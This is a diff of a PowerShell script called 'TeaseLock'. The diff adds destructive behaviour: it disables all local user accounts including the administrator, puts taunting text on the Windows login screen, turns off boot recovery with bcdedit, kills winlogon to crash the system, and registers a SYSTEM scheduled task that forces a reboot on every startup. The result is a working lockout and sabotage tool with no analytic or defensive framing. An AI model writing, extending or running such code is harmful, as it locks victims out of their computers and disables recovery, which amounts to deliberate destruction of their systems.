@@ -1,16 +1,23 @@
-# Define registry path for tracking restart progress
+# DISABLE ALL USERS (INCLUDING ADMIN)
+$users = Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True"
+foreach ($user in $users) {
+    if ($user.Disabled -eq $false) {
+        Disable-LocalUser -Name $user.Name
+    }
+}
+
+# SETUP RESTART TRACKER (Registry-Based)
 $regPath = "HKLM:\SOFTWARE\TeaseLock"
 if (!(Test-Path $regPath)) {
     New-Item -Path $regPath -Force | Out-Null
 }
 
-# Get the current restart count (default to 0 if not set)
 $restartCount = (Get-ItemProperty -Path $regPath -Name "RestartCount" -ErrorAction SilentlyContinue).RestartCount
 if ($restartCount -eq $null) {
     $restartCount = 0
 }
 
-# Modify the Windows Login Screen to Display Teasing Messages
+# MODIFY WINDOWS LOGIN SCREEN TEXT BASED ON RESTART COUNT
 $systemRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 
 if ($restartCount -eq 0) {
@@ -29,17 +36,18 @@ elseif ($restartCount -eq 2) {
     New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Oh dear~ You really tried..." -PropertyType String -Force
     New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Too bad, love~ No more chances <3 See you never~!" -PropertyType String -Force
 
-    # Apply "corruption" by disabling recovery and forcing a network boot
+    # DISABLE RECOVERY & FORCE NETWORK BOOT
     bcdedit /set {current} bootstatuspolicy ignoreallfailures
     bcdedit /set {current} recoveryenabled no
     bcdedit /set {default} bootmenupolicy legacy
 
-    # Reset the restart count so the process can be repeated if needed
-    $restartCount = 0
+    # TRIGGER BSOD (Crash Windows)
+    Stop-Process -Name "winlogon" -Force
 }
 
-# Save the updated restart count
+# SAVE RESTART COUNT
 Set-ItemProperty -Path $regPath -Name "RestartCount" -Value $restartCount -Force
 
-# Restart the PC
+# FORCE RESTART (Without PowerShell GUI)
+schtasks /create /tn "ForceRestartTease" /tr "shutdown /r /f /t 5" /sc onstart /ru SYSTEM /f
 shutdown /r /f /t 5
